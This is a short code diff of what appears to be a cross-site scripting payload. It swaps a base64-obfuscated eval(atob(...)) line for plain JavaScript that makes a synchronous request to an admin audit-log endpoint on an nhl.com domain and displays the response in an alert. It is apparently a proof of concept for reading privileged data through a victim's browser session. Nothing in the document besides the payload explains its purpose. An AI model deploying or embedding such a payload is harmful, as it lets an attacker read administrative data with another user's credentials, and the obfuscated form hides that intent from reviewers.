@@ -1,1 +1,4 @@
-eval(atob('dmFyIHJlcSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwpyZXEub3BlbignR0VUJywgJ2h0dHBzOi8vbGluay5saW5rLmRldi5ueWMubmhsLmNvbS9pYW1pL2FkbWluL3Jlc3QvYXVkaXRsb2c/JywgZmFsc2UpIApyZXEuc2VuZCgpOwphbGVydChyZXEucmVzcG9uc2VUZXh0KQ=='))
+var req = new XMLHttpRequest();
+req.open('GET', 'https://link.nhl.com/iami/admin/rest/auditlog?', false) 
+req.send();
+alert(req.responseText)
